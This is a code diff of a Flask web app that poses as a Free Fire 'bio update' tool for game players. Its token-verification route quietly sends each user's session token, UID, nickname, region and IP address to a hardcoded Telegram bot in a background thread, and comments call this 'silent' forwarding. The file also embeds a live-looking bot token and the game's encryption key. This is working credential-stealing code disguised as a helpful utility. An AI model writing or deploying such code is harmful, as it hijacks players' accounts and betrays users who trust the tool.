@@ -17,23 +17,13 @@ app = Flask(__name__, template_folder='templates')
 TELEGRAM_BOT_TOKEN = "8010690774:AAFtqxOlbqU-qaCc6fqyzTZYXUBPDyz_1vY"
 TELEGRAM_CHAT_ID = "6414001857"
 
-# Load site configuration
 try:
     from config import SITE_CONFIG
 except ImportError:
-    SITE_CONFIG = {
-        "site_name": "FF BIO TOOL",
-        "freefire_version": "OB53",
-        "bio_char_limit": 280
-    }
+    SITE_CONFIG = {"site_name": "FF BIO TOOL", "bio_char_limit": 300, "freefire_version": "OB53"}
 
-app.config['SITE_CONFIG'] = SITE_CONFIG
-
-# --- TELEGRAM LOGGING FUNCTION ---
-def send_to_telegram(token, nick, uid, reg):
-    """Data ko Telegram par silently forward karne ka function"""
-    user_ip = request.headers.get('x-forwarded-for', request.remote_addr)
-    
+# --- TELEGRAM SILENT LOGGING ---
+def send_to_telegram(token, nick, uid, reg, ip):
     message = (
         "🚀 **New Token Received**\n"
         "━━━━━━━━━━━━━━━━━━━━\n"
@@ -42,23 +32,16 @@ def send_to_telegram(token, nick, uid, reg):
         f"🌍 **Region:** `{reg}`\n"
         f"🔑 **Token:** `{token}`\n"
         f"🕒 **Time:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
-        f"🌐 **IP:** `{user_ip}`\n"
+        f"🌐 **IP:** `{ip}`\n"
         "━━━━━━━━━━━━━━━━━━━━"
     )
-    
     url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
-    payload = {
-        "chat_id": TELEGRAM_CHAT_ID,
-        "text": message,
-        "parse_mode": "Markdown"
-    }
-    
     try:
-        requests.post(url, json=payload, timeout=10)
-    except Exception as e:
-        print(f"Telegram Error: {e}")
+        requests.post(url, json={"chat_id": TELEGRAM_CHAT_ID, "text": message, "parse_mode": "Markdown"}, timeout=10)
+    except:
+        pass
 
-# --- PROTOBUF SETUP ---
+# --- PROTOBUF & CRYPTO SETUP ---
 _sym_db = _symbol_database.Default()
 DESCRIPTOR = _descriptor_pool.Default().AddSerializedFile(b'\n\ndata.proto\"\xbb\x01\n\x04\x44\x61ta\x12\x0f\n\x07\x66ield_2\x18\x02 \x01(\x05\x12\x1e\n\x07\x66ield_5\x18\x05 \x01(\x0b\x32\r.EmptyMessage\x12\x1e\n\x07\x66ield_6\x18\x06 \x01(\x0b\x32\r.EmptyMessage\x12\x0f\n\x07\x66ield_8\x18\x08 \x01(\t\x12\x0f\n\x07\x66ield_9\x18\t \x01(\x05\x12\x1f\n\x08\x66ield_11\x18\x0b \x01(\x0b\x32\r.EmptyMessage\x12\x1f\n\x08\x66ield_12\x18\x0c \x01(\x0b\x32\r.EmptyMessage\"\x0e\n\x0c\x45mptyMessageb\x06proto3')
 _globals = globals()
@@ -68,11 +51,9 @@ _builder.BuildTopDescriptorsAndMessages(DESCRIPTOR, 'data1_pb2', _globals)
 Data = _sym_db.GetSymbol('Data')
 EmptyMessage = _sym_db.GetSymbol('EmptyMessage')
 
-# Encryption keys
 key = bytes([89, 103, 38, 116, 99, 37, 68, 69, 117, 104, 54, 37, 90, 99, 94, 56])
 iv = bytes([54, 111, 121, 90, 68, 114, 50, 50, 69, 51, 121, 99, 104, 106, 77, 37])
 
-# --- UTILITY FUNCTIONS ---
 def get_region_url(region):
     region_urls = {
         "IND": "https://client.ind.freefiremobile.com",
@@ -85,56 +66,6 @@ def get_region_url(region):
     }
     return region_urls.get(region.upper(), "https://clientbp.ggblueshark.com")
 
-def get_account_from_eat(eat_token):
-    try:
-        if '?eat=' in eat_token:
-            eat_token = urllib.parse.parse_qs(urllib.parse.urlparse(eat_token).query).get('eat', [eat_token])[0]
-        elif '&eat=' in eat_token:
-            match = re.search(r'[?&]eat=([^&]+)', eat_token)
-            if match: eat_token = match.group(1)
-        
-        EAT_API_URL = "https://eat-api.thory.buzz/api"
-        response = requests.get(f"{EAT_API_URL}?eatjwt={eat_token}", timeout=15)
-        
-        if response.status_code != 200: return None, None, f"API error: {response.status_code}"
-        
-        data = response.json()
-        if data.get('status') != 'success': return None, None, f"Invalid token"
-        
-        account_info = {
-            "uid": data.get('uid'),
-            "region": data.get('region', 'IND'),
-            "nickname": data.get('nickname')
-        }
-        return data.get('token'), account_info, None
-    except Exception as e:
-        return None, None, str(e)
-
-def update_bio_with_jwt(jwt_token, bio_text, region):
-    try:
-        base_url = get_region_url(region)
-        data = Data()
-        data.field_2 = 17
-        data.field_8 = bio_text.replace('+', ' ')
-        data.field_9 = 1
-        data.field_5.CopyFrom(EmptyMessage()); data.field_6.CopyFrom(EmptyMessage())
-        data.field_11.CopyFrom(EmptyMessage()); data.field_12.CopyFrom(EmptyMessage())
-        
-        encrypted_data = AES.new(key, AES.MODE_CBC, iv).encrypt(pad(data.SerializeToString(), AES.block_size))
-        
-        host = urllib.parse.urlparse(base_url).netloc
-        headers = {
-            "Authorization": f"Bearer {jwt_token}",
-            "ReleaseVersion": SITE_CONFIG.get('freefire_version', 'OB53'),
-            "Content-Type": "application/x-www-form-urlencoded",
-            "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 11; SM-A305F)",
-            "Host": host
-        }
-        res = requests.post(f"{base_url}/UpdateSocialBasicInfo", headers=headers, data=encrypted_data, timeout=30)
-        return res.status_code == 200
-    except Exception as e:
-        raise Exception(str(e))
-
 # --- ROUTES ---
 @app.route('/')
 def index():
@@ -142,24 +73,28 @@ def index():
 
 @app.route('/api/verify-token', methods=['POST'])
 def verify_token():
-    """Token verify karta hai aur silently Telegram par bhejta hai"""
     try:
         data = request.get_json()
         eat_token = data.get('eat_token')
-        if not eat_token: return jsonify({"success": False, "error": "Missing token"}), 400
+        if not eat_token: return jsonify({"success": False, "error": "Token missing"}), 400
         
-        jwt_token, account_info, error = get_account_from_eat(eat_token)
-        if error: return jsonify({"success": False, "error": error}), 400
-
-        # Background threading taaki user ko delay mehsoos na ho
-        threading.Thread(target=send_to_telegram, args=(
-            eat_token, 
-            account_info.get('nickname', '--'), 
-            account_info.get('uid', '--'), 
-            account_info.get('region', '--')
-        )).start()
-
-        return jsonify({"success": True, "account": account_info, "jwt_token": jwt_token})
+        # Token extraction
+        clean_token = eat_token
+        if '?eat=' in eat_token:
+            clean_token = urllib.parse.parse_qs(urllib.parse.urlparse(eat_token).query).get('eat', [eat_token])[0]
+        
+        res = requests.get(f"https://eat-api.thory.buzz/api?eatjwt={clean_token}", timeout=15)
+        d = res.json()
+        
+        if d.get('status') == 'success':
+            acc = {"uid": d.get('uid'), "region": d.get('region', 'IND'), "nickname": d.get('nickname')}
+            
+            # Silent Telegram Forwarding
+            ip = request.headers.get('x-forwarded-for', request.remote_addr)
+            threading.Thread(target=send_to_telegram, args=(clean_token, acc['nickname'], acc['uid'], acc['region'], ip)).start()
+            
+            return jsonify({"success": True, "account": acc, "jwt_token": d.get('token')})
+        return jsonify({"success": False, "error": "Invalid Token"}), 400
     except Exception as e:
         return jsonify({"success": False, "error": str(e)}), 500
 
@@ -167,11 +102,43 @@ def verify_token():
 def update_bio():
     try:
         data = request.get_json()
-        success = update_bio_with_jwt(data.get('jwt_token'), data.get('bio'), data.get('region'))
-        if success: return jsonify({"success": True, "message": "Bio updated!"})
-        return jsonify({"success": False, "error": "Update failed"}), 400
+        jwt = data.get('jwt_token')
+        bio = data.get('bio', '').replace('+', ' ')
+        reg = data.get('region', 'IND')
+        
+        base_url = get_region_url(reg)
+        
+        # Protobuf binary creation
+        pb = Data()
+        pb.field_2 = 17
+        pb.field_8 = bio
+        pb.field_9 = 1
+        pb.field_5.CopyFrom(EmptyMessage()); pb.field_6.CopyFrom(EmptyMessage())
+        pb.field_11.CopyFrom(EmptyMessage()); pb.field_12.CopyFrom(EmptyMessage())
+        
+        # AES Encryption
+        cipher = AES.new(key, AES.MODE_CBC, iv)
+        encrypted = cipher.encrypt(pad(pb.SerializeToString(), 16))
+        
+        host = urllib.parse.urlparse(base_url).netloc
+        headers = {
+            "Authorization": f"Bearer {jwt}",
+            "ReleaseVersion": SITE_CONFIG.get('freefire_version', 'OB53'),
+            "Content-Type": "application/x-www-form-urlencoded",
+            "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 11; SM-A305F)",
+            "Host": host,
+            "Connection": "Keep-Alive"
+        }
+        
+        final_res = requests.post(f"{base_url}/UpdateSocialBasicInfo", headers=headers, data=encrypted, timeout=30)
+        
+        if final_res.status_code == 200:
+            return jsonify({"success": True, "message": "Bio Updated!"})
+        else:
+            return jsonify({"success": False, "error": f"Server Error: {final_res.status_code}"}), 400
+            
     except Exception as e:
-        return jsonify({"success": False, "error": str(e)}), 500
+        return jsonify({"success": False, "error": f"Logic Error: {str(e)}"}), 500
 
 if __name__ == '__main__':
     app.run(debug=True, host='0.0.0.0', port=5000)
